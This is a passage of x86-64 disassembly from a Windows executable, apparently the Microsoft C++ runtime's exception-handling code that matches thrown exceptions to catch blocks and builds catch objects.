   140003a5d:	74 30                	je     0x140003a8f
   140003a5f:	4b 8d 0c cb          	lea    (%r11,%r9,8),%rcx
   140003a63:	4a 63 14 11          	movslq (%rcx,%r10,1),%rdx
   140003a67:	49 03 d2             	add    %r10,%rdx
   140003a6a:	48 3b da             	cmp    %rdx,%rbx
   140003a6d:	72 08                	jb     0x140003a77
   140003a6f:	41 ff c1             	inc    %r9d
   140003a72:	45 3b c8             	cmp    %r8d,%r9d
   140003a75:	72 e8                	jb     0x140003a5f
   140003a77:	45 85 c9             	test   %r9d,%r9d
   140003a7a:	74 13                	je     0x140003a8f
   140003a7c:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140003a80:	49 8d 04 ca          	lea    (%r10,%rcx,8),%rax
   140003a84:	42 8b 44 18 04       	mov    0x4(%rax,%r11,1),%eax
   140003a89:	48 83 c4 20          	add    $0x20,%rsp
   140003a8d:	5b                   	pop    %rbx
   140003a8e:	c3                   	ret
   140003a8f:	83 c8 ff             	or     $0xffffffff,%eax
   140003a92:	eb f5                	jmp    0x140003a89
   140003a94:	e8 57 55 00 00       	call   0x140008ff0
   140003a99:	cc                   	int3
   140003a9a:	cc                   	int3
   140003a9b:	cc                   	int3
   140003a9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003aa1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003aa6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003aab:	41 55                	push   %r13
   140003aad:	41 56                	push   %r14
   140003aaf:	41 57                	push   %r15
   140003ab1:	48 83 ec 30          	sub    $0x30,%rsp
   140003ab5:	4d 8b f1             	mov    %r9,%r14
   140003ab8:	49 8b d8             	mov    %r8,%rbx
   140003abb:	48 8b f2             	mov    %rdx,%rsi
   140003abe:	4c 8b e9             	mov    %rcx,%r13
   140003ac1:	33 ff                	xor    %edi,%edi
   140003ac3:	4d 63 78 04          	movslq 0x4(%r8),%r15
   140003ac7:	45 85 ff             	test   %r15d,%r15d
   140003aca:	74 0b                	je     0x140003ad7
   140003acc:	e8 df fd ff ff       	call   0x1400038b0
   140003ad1:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   140003ad5:	eb 03                	jmp    0x140003ada
   140003ad7:	48 8b d7             	mov    %rdi,%rdx
   140003ada:	48 85 d2             	test   %rdx,%rdx
   140003add:	0f 84 6f 01 00 00    	je     0x140003c52
   140003ae3:	4c 63 7b 04          	movslq 0x4(%rbx),%r15
   140003ae7:	45 85 ff             	test   %r15d,%r15d
   140003aea:	74 0b                	je     0x140003af7
   140003aec:	e8 bf fd ff ff       	call   0x1400038b0
   140003af1:	49 8d 0c 07          	lea    (%r15,%rax,1),%rcx
   140003af5:	eb 03                	jmp    0x140003afa
   140003af7:	48 8b cf             	mov    %rdi,%rcx
   140003afa:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   140003afe:	0f 84 4e 01 00 00    	je     0x140003c52
   140003b04:	39 7b 08             	cmp    %edi,0x8(%rbx)
   140003b07:	75 08                	jne    0x140003b11
   140003b09:	39 3b                	cmp    %edi,(%rbx)
   140003b0b:	0f 8d 41 01 00 00    	jge    0x140003c52
   140003b11:	39 3b                	cmp    %edi,(%rbx)
   140003b13:	7c 0a                	jl     0x140003b1f
   140003b15:	48 63 43 08          	movslq 0x8(%rbx),%rax
   140003b19:	48 03 06             	add    (%rsi),%rax
   140003b1c:	48 8b f0             	mov    %rax,%rsi
   140003b1f:	f6 03 80             	testb  $0x80,(%rbx)
   140003b22:	74 32                	je     0x140003b56
   140003b24:	41 f6 06 10          	testb  $0x10,(%r14)
   140003b28:	74 2c                	je     0x140003b56
   140003b2a:	48 8b 05 bf e5 01 00 	mov    0x1e5bf(%rip),%rax        # 0x1400220f0
   140003b31:	48 85 c0             	test   %rax,%rax
   140003b34:	74 20                	je     0x140003b56
   140003b36:	ff 15 d4 17 01 00    	call   *0x117d4(%rip)        # 0x140015310
   140003b3c:	48 85 c0             	test   %rax,%rax
   140003b3f:	0f 84 29 01 00 00    	je     0x140003c6e
   140003b45:	48 85 f6             	test   %rsi,%rsi
   140003b48:	0f 84 20 01 00 00    	je     0x140003c6e
   140003b4e:	48 89 06             	mov    %rax,(%rsi)
   140003b51:	48 8b c8             	mov    %rax,%rcx
   140003b54:	eb 5f                	jmp    0x140003bb5
   140003b56:	f6 03 08             	testb  $0x8,(%rbx)
   140003b59:	74 1b                	je     0x140003b76
   140003b5b:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140003b5f:	48 85 c9             	test   %rcx,%rcx
   140003b62:	0f 84 0b 01 00 00    	je     0x140003c73
   140003b68:	48 85 f6             	test   %rsi,%rsi
   140003b6b:	0f 84 02 01 00 00    	je     0x140003c73
   140003b71:	48 89 0e             	mov    %rcx,(%rsi)
   140003b74:	eb 3f                	jmp    0x140003bb5
   140003b76:	41 f6 06 01          	testb  $0x1,(%r14)
   140003b7a:	74 4a                	je     0x140003bc6
   140003b7c:	49 8b 55 28          	mov    0x28(%r13),%rdx
   140003b80:	48 85 d2             	test   %rdx,%rdx
   140003b83:	0f 84 ef 00 00 00    	je     0x140003c78
   140003b89:	48 85 f6             	test   %rsi,%rsi
   140003b8c:	0f 84 e6 00 00 00    	je     0x140003c78
   140003b92:	4d 63 46 14          	movslq 0x14(%r14),%r8
   140003b96:	48 8b ce             	mov    %rsi,%rcx
   140003b99:	e8 92 fb 00 00       	call   0x140013730
   140003b9e:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   140003ba3:	0f 85 a5 00 00 00    	jne    0x140003c4e
   140003ba9:	48 39 3e             	cmp    %rdi,(%rsi)
   140003bac:	0f 84 9c 00 00 00    	je     0x140003c4e
   140003bb2:	48 8b 0e             	mov    (%rsi),%rcx
   140003bb5:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140003bb9:	e8 6e f0 ff ff       	call   0x140002c2c
   140003bbe:	48 89 06             	mov    %rax,(%rsi)
   140003bc1:	e9 88 00 00 00       	jmp    0x140003c4e
   140003bc6:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140003bca:	85 db                	test   %ebx,%ebx
   140003bcc:	74 0b                	je     0x140003bd9
   140003bce:	e8 f1 fc ff ff       	call   0x1400038c4
   140003bd3:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140003bd7:	eb 03                	jmp    0x140003bdc
   140003bd9:	48 8b cf             	mov    %rdi,%rcx
   140003bdc:	48 85 c9             	test   %rcx,%rcx
   140003bdf:	75 34                	jne    0x140003c15
   140003be1:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140003be5:	0f 84 92 00 00 00    	je     0x140003c7d
   140003beb:	48 85 f6             	test   %rsi,%rsi
   140003bee:	0f 84 89 00 00 00    	je     0x140003c7d
   140003bf4:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   140003bf8:	49 8d 56 08          	lea    0x8(%r14),%rdx
   140003bfc:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   140003c00:	e8 27 f0 ff ff       	call   0x140002c2c
   140003c05:	48 8b d0             	mov    %rax,%rdx
   140003c08:	4c 8b c3             	mov    %rbx,%r8
   140003c0b:	48 8b ce             	mov    %rsi,%rcx
   140003c0e:	e8 1d fb 00 00       	call   0x140013730
   140003c13:	eb 39                	jmp    0x140003c4e
   140003c15:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   140003c19:	74 67                	je     0x140003c82
   140003c1b:	48 85 f6             	test   %rsi,%rsi
   140003c1e:	74 62                	je     0x140003c82
   140003c20:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   140003c24:	85 db                	test   %ebx,%ebx
   140003c26:	74 0b                	je     0x140003c33
   140003c28:	e8 97 fc ff ff       	call   0x1400038c4
   140003c2d:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140003c31:	eb 03                	jmp    0x140003c36
   140003c33:	48 8b cf             	mov    %rdi,%rcx
   140003c36:	48 85 c9             	test   %rcx,%rcx
   140003c39:	74 47                	je     0x140003c82
   140003c3b:	41 8a 06             	mov    (%r14),%al
   140003c3e:	24 04                	and    $0x4,%al
   140003c40:	f6 d8                	neg    %al
   140003c42:	1b c9                	sbb    %ecx,%ecx
   140003c44:	f7 d9                	neg    %ecx
   140003c46:	ff c1                	inc    %ecx
   140003c48:	8b f9                	mov    %ecx,%edi
   140003c4a:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   140003c4e:	8b c7                	mov    %edi,%eax
   140003c50:	eb 02                	jmp    0x140003c54
   140003c52:	33 c0                	xor    %eax,%eax
   140003c54:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003c59:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140003c5e:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140003c63:	48 83 c4 30          	add    $0x30,%rsp
   140003c67:	41 5f                	pop    %r15
   140003c69:	41 5e                	pop    %r14
   140003c6b:	41 5d                	pop    %r13
   140003c6d:	c3                   	ret
   140003c6e:	e8 7d 53 00 00       	call   0x140008ff0
   140003c73:	e8 78 53 00 00       	call   0x140008ff0
   140003c78:	e8 73 53 00 00       	call   0x140008ff0
   140003c7d:	e8 6e 53 00 00       	call   0x140008ff0
   140003c82:	e8 69 53 00 00       	call   0x140008ff0
   140003c87:	90                   	nop
   140003c88:	e8 63 53 00 00       	call   0x140008ff0
   140003c8d:	90                   	nop
   140003c8e:	cc                   	int3
   140003c8f:	cc                   	int3
   140003c90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003c95:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003c9a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140003c9f:	41 56                	push   %r14
   140003ca1:	48 83 ec 20          	sub    $0x20,%rsp
   140003ca5:	49 8b f1             	mov    %r9,%rsi
   140003ca8:	4c 8b f1             	mov    %rcx,%r14
   140003cab:	33 db                	xor    %ebx,%ebx
   140003cad:	41 39 18             	cmp    %ebx,(%r8)
   140003cb0:	7d 05                	jge    0x140003cb7
   140003cb2:	48 8b fa             	mov    %rdx,%rdi
   140003cb5:	eb 07                	jmp    0x140003cbe
   140003cb7:	49 63 78 08          	movslq 0x8(%r8),%rdi
   140003cbb:	48 03 3a             	add    (%rdx),%rdi
   140003cbe:	e8 d9 fd ff ff       	call   0x140003a9c
   140003cc3:	83 e8 01             	sub    $0x1,%eax
   140003cc6:	74 3c                	je     0x140003d04
   140003cc8:	83 f8 01             	cmp    $0x1,%eax
   140003ccb:	75 67                	jne    0x140003d34
   140003ccd:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140003cd1:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140003cd5:	e8 52 ef ff ff       	call   0x140002c2c
   140003cda:	4c 8b f0             	mov    %rax,%r14
   140003cdd:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140003ce1:	85 f6                	test   %esi,%esi
   140003ce3:	74 09                	je     0x140003cee
   140003ce5:	e8 da fb ff ff       	call   0x1400038c4
   140003cea:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140003cee:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003cf4:	4d 8b c6             	mov    %r14,%r8
   140003cf7:	48 8b d3             	mov    %rbx,%rdx
   140003cfa:	48 8b cf             	mov    %rdi,%rcx
   140003cfd:	e8 56 12 00 00       	call   0x140004f58
   140003d02:	eb 30                	jmp    0x140003d34
   140003d04:	48 8d 56 08          	lea    0x8(%rsi),%rdx
   140003d08:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   140003d0c:	e8 1b ef ff ff       	call   0x140002c2c
   140003d11:	4c 8b f0             	mov    %rax,%r14
   140003d14:	48 63 76 18          	movslq 0x18(%rsi),%rsi
   140003d18:	85 f6                	test   %esi,%esi
   140003d1a:	74 09                	je     0x140003d25
   140003d1c:	e8 a3 fb ff ff       	call   0x1400038c4
   140003d21:	48 8d 1c 30          	lea    (%rax,%rsi,1),%rbx
   140003d25:	4d 8b c6             	mov    %r14,%r8
   140003d28:	48 8b d3             	mov    %rbx,%rdx
   140003d2b:	48 8b cf             	mov    %rdi,%rcx
   140003d2e:	e8 19 12 00 00       	call   0x140004f4c
   140003d33:	90                   	nop
   140003d34:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003d39:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140003d3e:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003d43:	48 83 c4 20          	add    $0x20,%rsp
   140003d47:	41 5e                	pop    %r14
   140003d49:	c3                   	ret
   140003d4a:	e8 a1 52 00 00       	call   0x140008ff0
   140003d4f:	90                   	nop
   140003d50:	48 8b c4             	mov    %rsp,%rax
   140003d53:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140003d57:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140003d5b:	55                   	push   %rbp
   140003d5c:	56                   	push   %rsi
   140003d5d:	57                   	push   %rdi
   140003d5e:	41 54                	push   %r12
   140003d60:	41 55                	push   %r13
   140003d62:	41 56                	push   %r14
   140003d64:	41 57                	push   %r15
   140003d66:	48 83 ec 60          	sub    $0x60,%rsp
   140003d6a:	4c 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%r8
   140003d71:	00 
   140003d72:	4d 8b e1             	mov    %r9,%r12
   140003d75:	4c 8b ea             	mov    %rdx,%r13
   140003d78:	4c 8d 48 10          	lea    0x10(%rax),%r9
   140003d7c:	4c 8b f1             	mov    %rcx,%r14
   140003d7f:	49 8b d4             	mov    %r12,%rdx
   140003d82:	49 8b cd             	mov    %r13,%rcx
   140003d85:	e8 72 f7 ff ff       	call   0x1400034fc
   140003d8a:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   140003d91:	00 
   140003d92:	4c 8b f8             	mov    %rax,%r15
   140003d95:	48 8b ac 24 c8 00 00 	mov    0xc8(%rsp),%rbp
   140003d9c:	00 
   140003d9d:	4d 85 c9             	test   %r9,%r9
   140003da0:	74 0e                	je     0x140003db0
   140003da2:	4c 8b c5             	mov    %rbp,%r8
   140003da5:	48 8b d0             	mov    %rax,%rdx
   140003da8:	49 8b ce             	mov    %r14,%rcx
   140003dab:	e8 e0 fe ff ff       	call   0x140003c90
   140003db0:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   140003db7:	00 
   140003db8:	48 63 5d 0c          	movslq 0xc(%rbp),%rbx
   140003dbc:	8b 79 08             	mov    0x8(%rcx),%edi
   140003dbf:	8b 31                	mov    (%rcx),%esi
   140003dc1:	e8 ea fa ff ff       	call   0x1400038b0
   140003dc6:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   140003dcd:	48 03 c3             	add    %rbx,%rax
   140003dd0:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   140003dd7:	00 
   140003dd8:	4d 8b cf             	mov    %r15,%r9
   140003ddb:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140003ddf:	49 8b d6             	mov    %r14,%rdx
   140003de2:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140003de9:	00 
   140003dea:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   140003def:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140003df4:	89 7c 24 38          	mov    %edi,0x38(%rsp)
   140003df8:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140003dfc:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003e01:	49 8b cd             	mov    %r13,%rcx
   140003e04:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003e09:	e8 0e f9 ff ff       	call   0x14000371c
   140003e0e:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   140003e15:	00 
   140003e16:	48 83 c4 60          	add    $0x60,%rsp
   140003e1a:	41 5f                	pop    %r15
   140003e1c:	41 5e                	pop    %r14
   140003e1e:	41 5d                	pop    %r13
   140003e20:	41 5c                	pop    %r12
   140003e22:	5f                   	pop    %rdi
   140003e23:	5e                   	pop    %rsi
   140003e24:	5d                   	pop    %rbp
   140003e25:	c3                   	ret
   140003e26:	cc                   	int3
   140003e27:	cc                   	int3
   140003e28:	40 55                	rex push %rbp
   140003e2a:	53                   	push   %rbx
   140003e2b:	56                   	push   %rsi
   140003e2c:	57                   	push   %rdi
   140003e2d:	41 54                	push   %r12
   140003e2f:	41 55                	push   %r13
   140003e31:	41 56                	push   %r14
   140003e33:	41 57                	push   %r15
   140003e35:	48 8d 6c 24 d8       	lea    -0x28(%rsp),%rbp
   140003e3a:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
   140003e41:	48 8b 05 b8 d1 01 00 	mov    0x1d1b8(%rip),%rax        # 0x140021000
   140003e48:	48 33 c4             	xor    %rsp,%rax
   140003e4b:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140003e4f:	48 8b b5 90 00 00 00 	mov    0x90(%rbp),%rsi
   140003e56:	4c 8b e2             	mov    %rdx,%r12
   140003e59:	4c 8b ad a8 00 00 00 	mov    0xa8(%rbp),%r13
   140003e60:	4d 8b f8             	mov    %r8,%r15
   140003e63:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140003e68:	48 8b f9             	mov    %rcx,%rdi
   140003e6b:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   140003e70:	4c 8b c6             	mov    %rsi,%r8
   140003e73:	49 8b cc             	mov    %r12,%rcx
   140003e76:	4c 89 6d 88          	mov    %r13,-0x78(%rbp)
   140003e7a:	49 8b d1             	mov    %r9,%rdx
   140003e7d:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   140003e82:	4d 8b f1             	mov    %r9,%r14
   140003e85:	e8 ba 0e 00 00       	call   0x140004d44
   140003e8a:	89 44 24 64          	mov    %eax,0x64(%rsp)
   140003e8e:	8b d8                	mov    %eax,%ebx
   140003e90:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003e93:	0f 8c 78 04 00 00    	jl     0x140004311
   140003e99:	3b 46 04             	cmp    0x4(%rsi),%eax
   140003e9c:	0f 8d 6f 04 00 00    	jge    0x140004311
   140003ea2:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003ea8:	0f 85 e2 00 00 00    	jne    0x140003f90
   140003eae:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140003eb2:	0f 85 d8 00 00 00    	jne    0x140003f90
   140003eb8:	8b 47 20             	mov    0x20(%rdi),%eax
   140003ebb:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140003ec0:	74 0e                	je     0x140003ed0
   140003ec2:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140003ec7:	83 f8 01             	cmp    $0x1,%eax
   140003eca:	0f 87 c0 00 00 00    	ja     0x140003f90
   140003ed0:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140003ed5:	0f 85 b5 00 00 00    	jne    0x140003f90
   140003edb:	e8 1c f0 ff ff       	call   0x140002efc
   140003ee0:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   140003ee5:	0f 84 bf 03 00 00    	je     0x1400042aa
   140003eeb:	e8 0c f0 ff ff       	call   0x140002efc
   140003ef0:	48 8b 78 20          	mov    0x20(%rax),%rdi
   140003ef4:	e8 03 f0 ff ff       	call   0x140002efc
   140003ef9:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   140003efd:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   140003f02:	4c 8b 78 28          	mov    0x28(%rax),%r15
   140003f06:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   140003f0b:	e8 e0 f9 ff ff       	call   0x1400038f0
   140003f10:	48 85 ff             	test   %rdi,%rdi
   140003f13:	0f 84 f8 03 00 00    	je     0x140004311
   140003f19:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003f1f:	75 25                	jne    0x140003f46
   140003f21:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140003f25:	75 1f                	jne    0x140003f46
   140003f27:	8b 47 20             	mov    0x20(%rdi),%eax
   140003f2a:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140003f2f:	74 0a                	je     0x140003f3b
   140003f31:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140003f36:	83 f8 01             	cmp    $0x1,%eax
   140003f39:	77 0b                	ja     0x140003f46
   140003f3b:	48 83 7f 30 00       	cmpq   $0x0,0x30(%rdi)
   140003f40:	0f 84 cb 03 00 00    	je     0x140004311
   140003f46:	e8 b1 ef ff ff       	call   0x140002efc
   140003f4b:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140003f50:	74 3e                	je     0x140003f90
   140003f52:	e8 a5 ef ff ff       	call   0x140002efc
   140003f57:	48 8b 58 38          	mov    0x38(%rax),%rbx
   140003f5b:	e8 9c ef ff ff       	call   0x140002efc
   140003f60:	48 8b d3             	mov    %rbx,%rdx
   140003f63:	48 8b cf             	mov    %rdi,%rcx
   140003f66:	48 c7 40 38 00 00 00 	movq   $0x0,0x38(%rax)
   140003f6d:	00 
   140003f6e:	e8 69 0e 00 00       	call   0x140004ddc
   140003f73:	84 c0                	test   %al,%al
   140003f75:	75 15                	jne    0x140003f8c
   140003f77:	48 8b cb             	mov    %rbx,%rcx
   140003f7a:	e8 45 0f 00 00       	call   0x140004ec4
   140003f7f:	84 c0                	test   %al,%al
   140003f81:	0f 84 67 03 00 00    	je     0x1400042ee
   140003f87:	e9 3e 03 00 00       	jmp    0x1400042ca
   140003f8c:	8b 5c 24 64          	mov    0x64(%rsp),%ebx
   140003f90:	49 8b 46 08          	mov    0x8(%r14),%rax
   140003f94:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140003f98:	48 89 75 b8          	mov    %rsi,-0x48(%rbp)
   140003f9c:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   140003fa2:	0f 85 ba 02 00 00    	jne    0x140004262
   140003fa8:	83 7f 18 04          	cmpl   $0x4,0x18(%rdi)
   140003fac:	0f 85 b0 02 00 00    	jne    0x140004262
   140003fb2:	8b 47 20             	mov    0x20(%rdi),%eax
   140003fb5:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140003fba:	74 0e                	je     0x140003fca
   140003fbc:	05 df fa 6c e6       	add    $0xe66cfadf,%eax
   140003fc1:	83 f8 01             	cmp    $0x1,%eax
   140003fc4:	0f 87 98 02 00 00    	ja     0x140004262
   140003fca:	83 7e 0c 00          	cmpl   $0x0,0xc(%rsi)
   140003fce:	0f 86 c6 01 00 00    	jbe    0x14000419a
   140003fd4:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140003fda:	48 8d 55 b8          	lea    -0x48(%rbp),%rdx
   140003fde:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140003fe2:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003fe6:	4d 8b ce             	mov    %r14,%r9
   140003fe9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003fee:	44 8b c3             	mov    %ebx,%r8d
   140003ff1:	e8 ee f5 ff ff       	call   0x1400035e4
   140003ff6:	0f 10 4d d8          	movups -0x28(%rbp),%xmm1
   140003ffa:	66 0f 6f c1          	movdqa %xmm1,%xmm0
   140003ffe:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004003:	66 0f 7e c0          	movd   %xmm0,%eax
   140004007:	f3 0f 7f 4d c8       	movdqu %xmm1,-0x38(%rbp)
   14000400c:	3b 45 f0             	cmp    -0x10(%rbp),%eax
   14000400f:	0f 83 85 01 00 00    	jae    0x14000419a
   140004015:	44 8b 7d d0          	mov    -0x30(%rbp),%r15d
   140004019:	66 49 0f 7e c9       	movq   %xmm1,%r9
   14000401e:	4c 89 4d 80          	mov    %r9,-0x80(%rbp)
   140004022:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140004026:	48 8b 00             	mov    (%rax),%rax
   140004029:	48 63 50 10          	movslq 0x10(%rax),%rdx
   14000402d:	41 8b c7             	mov    %r15d,%eax
   140004030:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140004034:	49 8b 41 08          	mov    0x8(%r9),%rax
   140004038:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   14000403c:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   140004041:	49 63 4c 00 10       	movslq 0x10(%r8,%rax,1),%rcx
   140004046:	89 4d b0             	mov    %ecx,-0x50(%rbp)
   140004049:	66 0f 7e c0          	movd   %xmm0,%eax
   14000404d:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   140004051:	3b c3                	cmp    %ebx,%eax
   140004053:	0f 8f 34 01 00 00    	jg     0x14000418d
   140004059:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000405e:	48 c1 e8 20          	shr    $0x20,%rax
   140004062:	3b d8                	cmp    %eax,%ebx
   140004064:	0f 8f 23 01 00 00    	jg     0x14000418d
   14000406a:	49 03 4e 08          	add    0x8(%r14),%rcx
   14000406e:	45 33 e4             	xor    %r12d,%r12d
   140004071:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140004076:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000407b:	48 89 4d 98          	mov    %rcx,-0x68(%rbp)
   14000407f:	48 c1 e8 20          	shr    $0x20,%rax
   140004083:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140004087:	85 c0                	test   %eax,%eax
   140004089:	0f 84 f9 00 00 00    	je     0x140004188
   14000408f:	4b 8d 04 a4          	lea    (%r12,%r12,4),%rax
   140004093:	0f 10 04 81          	movups (%rcx,%rax,4),%xmm0
   140004097:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   14000409b:	8b 44 81 10          	mov    0x10(%rcx,%rax,4),%eax
   14000409f:	89 45 08             	mov    %eax,0x8(%rbp)
   1400040a2:	48 8b 47 30          	mov    0x30(%rdi),%rax
   1400040a6:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   1400040aa:	e8 15 f8 ff ff       	call   0x1400038c4
   1400040af:	48 8d 48 04          	lea    0x4(%rax),%rcx
   1400040b3:	48 8b 47 30          	mov    0x30(%rdi),%rax
   1400040b7:	48 03 cb             	add    %rbx,%rcx
   1400040ba:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1400040bf:	48 63 58 0c          	movslq 0xc(%rax),%rbx
   1400040c3:	e8 fc f7 ff ff       	call   0x1400038c4
   1400040c8:	44 8b 2c 18          	mov    (%rax,%rbx,1),%r13d
   1400040cc:	45 85 ed             	test   %r13d,%r13d
   1400040cf:	7e 3a                	jle    0x14000410b
   1400040d1:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400040d6:	48 63 18             	movslq (%rax),%rbx
   1400040d9:	e8 e6 f7 ff ff       	call   0x1400038c4
   1400040de:	4c 8b 47 30          	mov    0x30(%rdi),%r8
   1400040e2:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400040e6:	48 03 d8             	add    %rax,%rbx
   1400040e9:	48 8b d3             	mov    %rbx,%rdx
   1400040ec:	e8 8b 04 00 00       	call   0x14000457c
   1400040f1:	85 c0                	test   %eax,%eax
   1400040f3:	75 28                	jne    0x14000411d
   1400040f5:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400040fa:	41 ff cd             	dec    %r13d
   1400040fd:	48 83 c0 04          	add    $0x4,%rax
   140004101:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140004106:	45 85 ed             	test   %r13d,%r13d
   140004109:	7f cb                	jg     0x1400040d6
   14000410b:	41 ff c4             	inc    %r12d
   14000410e:	44 3b 65 90          	cmp    -0x70(%rbp),%r12d
   140004112:	74 6c                	je     0x140004180
   140004114:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140004118:	e9 72 ff ff ff       	jmp    0x14000408f
   14000411d:	8a 85 98 00 00 00    	mov    0x98(%rbp),%al
   140004123:	4d 8b ce             	mov    %r14,%r9
   140004126:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000412b:	48 8b cf             	mov    %rdi,%rcx
   14000412e:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   140004133:	49 8b d4             	mov    %r12,%rdx
   140004136:	88 44 24 58          	mov    %al,0x58(%rsp)
   14000413a:	8a 44 24 60          	mov    0x60(%rsp),%al
   14000413e:	88 44 24 50          	mov    %al,0x50(%rsp)
   140004142:	48 8b 45 88          	mov    -0x78(%rbp),%rax
   140004146:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000414b:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140004151:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140004155:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140004159:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000415e:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   140004162:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140004167:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000416c:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004171:	e8 da fb ff ff       	call   0x140003d50
   140004176:	4c 8b 4d 80          	mov    -0x80(%rbp),%r9
   14000417a:	8b 5c 24 64          	mov    0x64(%rsp),%ebx
   14000417e:	eb 0d                	jmp    0x14000418d
   140004180:	8b 5c 24 64          	mov    0x64(%rsp),%ebx
   140004184:	4c 8b 4d 80          	mov    -0x80(%rbp),%r9
   140004188:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000418d:	41 ff c7             	inc    %r15d
